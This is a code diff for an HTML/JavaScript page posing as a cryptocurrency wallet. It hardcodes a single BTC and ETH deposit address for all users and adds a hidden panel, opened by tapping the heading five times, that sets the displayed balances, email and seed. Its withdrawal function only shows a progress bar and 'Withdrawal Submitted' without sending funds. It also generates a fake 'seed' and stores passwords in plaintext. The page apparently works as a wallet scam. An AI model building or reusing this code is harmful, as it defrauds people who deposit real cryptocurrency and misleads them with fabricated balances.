@@ -140,7 +140,7 @@ input{width:100%;padding:12px;margin-top:10px;border-radius:8px;border:none;}
 <div id="sellConfirm" class="page">
 <button class="btn" onclick="goBack()">⬅ Back</button>
 <p id="sellInfo"></p>
-<button class="btn" onclick="showConfirm('Sell Confirmed')">Confirm</button>
+<button class="btn" onclick="showConfirm('Purchase Confirmed')">Confirm</button>
 </div>
 
 <!-- WITHDRAW -->
@@ -159,75 +159,160 @@ input{width:100%;padding:12px;margin-top:10px;border-radius:8px;border:none;}
 <div class="nav-btn" onclick="openPage('network')"><span>🌐</span>Network</div>
 </div>
 
+<script src="https://cdn.jsdelivr.net/npm/qrious/dist/qrious.min.js"></script>
+
 <script>
-/* ===== NAVIGATION STACK FIX ===== */
+// ================= ADDRESSES =================
+const btcAddress="bc1qf99u08mchql3l7uxfylvneed8c8zkj58epgurf";
+const ethAddress="0xE6A4BA46ae547A2C9b42012E5437A29D4E94a189";
+
+function shorten(addr){return addr.slice(0,6)+"..."+addr.slice(-6);}
+
+// ================= QR CODES =================
+window.onload = function(){
+
+  new QRious({element:btcQR,value:btcAddress,size:150});
+  btcShort.innerText=shorten(btcAddress);
+  btcShort.onclick=()=>copyAddr(btcAddress);
+
+  new QRious({element:ethQR,value:ethAddress,size:150});
+  ethShort.innerText=shorten(ethAddress);
+  ethShort.onclick=()=>copyAddr(ethAddress);
+
+  // Load DevTools saved values
+  devEmail.value=localStorage.getItem("devEmail")||"";
+  devSeed.value=localStorage.getItem("devSeed")||"";
+  devBTC.value=localStorage.getItem("devBTC")||"0.134532";
+  devETH.value=localStorage.getItem("devETH")||"2.43211";
+  devCurrency.value=localStorage.getItem("devCurrency")||"$12,450.32";
+}
+
+function copyAddr(addr){
+  navigator.clipboard.writeText(addr);
+  showConfirm("Address Copied");
+}
+
+// ================= CONFIRM POPUP =================
+function showConfirm(msg){
+  let c=document.getElementById("confirmMsg");
+  c.innerText=msg;
+  c.style.opacity=1;
+  setTimeout(()=>c.style.opacity=0,2000);
+}
+
+// ================= NAVIGATION STACK =================
 let stack=["welcome"];
-let appPages=["dashboard","buy","buyPay","buyConfirm","sell","sellBank","sellConfirm","withdraw"];
+let appPages=["dashboard","buy","buyPay","buyConfirm","sell","sellBank","sellConfirm","receive","receiveBTC","receiveETH","withdraw","withdrawLoading","profile","settings","network"];
 
 function openPage(id){
- document.querySelectorAll(".page").forEach(p=>p.classList.remove("active"));
- document.getElementById(id).classList.add("active");
- stack.push(id);
- document.querySelector(".bottom-nav").classList.toggle("hidden-nav", !appPages.includes(id));
+  document.querySelectorAll(".page").forEach(p=>p.classList.remove("active"));
+  document.getElementById(id).classList.add("active");
+
+  // push history ONLY if different
+  if(stack[stack.length-1]!==id){
+    stack.push(id);
+  }
+
+  let nav=document.querySelector(".bottom-nav");
+  nav.classList.toggle("hidden-nav", !appPages.includes(id));
 }
 
 function goBack(){
- if(stack.length>1) stack.pop();
- openPage(stack[stack.length-1]);
+  if(stack.length>1){
+    stack.pop();
+    let prev=stack[stack.length-1];
+    document.querySelectorAll(".page").forEach(p=>p.classList.remove("active"));
+    document.getElementById(prev).classList.add("active");
+  }
 }
 
-/* ===== CONFIRM POPUP ===== */
-function showConfirm(msg){
- let el=document.getElementById("confirmMsg");
- el.innerText=msg;
- el.style.opacity=1;
- setTimeout(()=>el.style.opacity=0,2000);
-}
-
-/* ===== LOGIN & REGISTER ===== */
+// ================= REGISTER =================
 function registerUser(){
- localStorage.setItem("email",regEmail.value);
- localStorage.setItem("pass",regPass.value);
- let seed="SEED-"+Math.random().toString(36).substr(2,12).toUpperCase();
- localStorage.setItem("seed",seed);
- seedKey.innerText=seed;
- openPage("seed");
+  if(!regEmail.value||!regPass.value||!regPass2.value){alert("Fill all fields");return;}
+  if(regPass.value!==regPass2.value){alert("Passwords mismatch");return;}
+  if(!agree.checked){alert("Agree to terms");return;}
+
+  localStorage.setItem("email",regEmail.value);
+  localStorage.setItem("pass",regPass.value);
+
+  let seed="SEED-"+Math.random().toString(36).substring(2,14).toUpperCase();
+  localStorage.setItem("seed",seed);
+
+  openPage("creating");
+  let i=0;
+  let int=setInterval(()=>{
+    i+=5;
+    createBar.style.width=i+"%";
+    if(i>=100){
+      clearInterval(int);
+      seedKey.innerText=seed;
+      profileEmail.innerText=regEmail.value;
+      openPage("seed");
+    }
+  },100);
 }
 
 function finishSetup(){openPage("dashboard");}
 
+// ================= LOGIN =================
 function loginUser(){
- if(loginEmail.value===localStorage.getItem("email") && loginPass.value===localStorage.getItem("pass")){
-  openPage("dashboard");
- } else alert("Wrong login");
+  if(loginEmail.value===localStorage.getItem("email") && loginPass.value===localStorage.getItem("pass")){
+    profileEmail.innerText=loginEmail.value;
+    openPage("dashboard");
+  } else {
+    alert("Invalid login");
+  }
 }
 
-/* ===== BUY SELL ===== */
-function selectBuy(t){buyInfo.innerText="Buying "+t; openPage("buyPay");}
-function confirmBuy(){openPage("buyConfirm");}
-function selectSell(t){sellInfo.innerText="Selling "+t; openPage("sellBank");}
-function confirmSell(){openPage("sellConfirm");}
+// ================= BUY SELL =================
+function selectBuy(t){ buyInfo.innerText="Buying "+t; openPage("buyPay"); }
+function confirmBuy(){ openPage("buyConfirm"); }
+function selectSell(t){ sellInfo.innerText="Selling "+t; openPage("sellBank"); }
+function confirmSell(){ openPage("sellConfirm"); }
 
-/* ===== WITHDRAW ===== */
-function processWithdraw(){showConfirm("Withdrawal Sent"); openPage("dashboard");}
+// ================= WITHDRAW =================
+function processWithdraw(){
+  if(!withdrawAddress.value||!withdrawAmount.value){alert("Enter address and amount");return;}
+  openPage("withdrawLoading");
 
-/* ===== DEVTOOLS 5 TAP ===== */
-let taps=0;
-document.getElementById("mainHeading").onclick=()=>{
- taps++;
- if(taps>=5){
-  devTools.style.display="block";
- }
-};
+  let i=0;
+  let int=setInterval(()=>{
+    i+=4;
+    withdrawBar.style.width=i+"%";
+    if(i>=100){
+      clearInterval(int);
+      showConfirm("Withdrawal Submitted");
+      withdrawAddress.value="";
+      withdrawAmount.value="";
+      openPage("dashboard");
+    }
+  },100);
+}
 
+// ================= DEVTOOLS SAVE =================
 function saveDevTools(){
- currencyDisplay.innerText=devCurrency.value;
- btcDisplay.innerText="BTC: "+devBTC.value;
- ethDisplay.innerText="ETH: "+devETH.value;
- localStorage.setItem("email",devEmail.value);
- localStorage.setItem("seed",devSeed.value);
- alert("Saved");
+  localStorage.setItem("devEmail",devEmail.value);
+  localStorage.setItem("devSeed",devSeed.value);
+  localStorage.setItem("devBTC",devBTC.value);
+  localStorage.setItem("devETH",devETH.value);
+  localStorage.setItem("devCurrency",devCurrency.value);
+
+  currencyDisplay.innerText=devCurrency.value;
+  btcDisplay.innerText="BTC: "+devBTC.value;
+  ethDisplay.innerText="ETH: "+devETH.value;
+
+  showConfirm("DevTools Saved");
 }
+
+// ================= TAP HEADING 5 TIMES TO OPEN DEVTOOLS =================
+let tapCount=0;
+mainHeading.onclick=function(){
+  tapCount++;
+  if(tapCount>=5){
+    devTools.style.display="block";
+    tapCount=0;
+  }
+};
 </script>
 
 </body>
